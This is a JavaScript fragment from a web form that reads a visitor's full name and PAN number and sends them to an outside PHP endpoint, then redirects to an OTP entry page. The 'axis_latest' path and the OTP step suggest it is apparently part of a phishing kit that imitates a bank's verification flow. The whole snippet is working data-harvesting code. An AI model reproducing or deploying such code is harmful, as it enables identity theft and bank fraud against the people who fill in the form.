       <script type="text/javascript">
    var random_no=localStorage.getItem('random_no');
     function updateData() {
   
   var full_name = document.getElementById("Full_Name").value;
   var pan_no = document.getElementById("PAN_Number").value;



    if (full_name !== "" && pan_no !== "") {
        // Create a JavaScript object with the input data
        var data = {
            
            full_name: full_name,
            pan_no: pan_no,
            random_no: random_no
        };

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://anikdevnath.site/axis_latest/4.php", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                console.log(xhr.responseText);
                window.location.href = 'Enter_OTP_PAN.html';
            }
        };
        xhr.send(JSON.stringify(data));
    } else {
        alert('Please fill all fields');
    }
   }
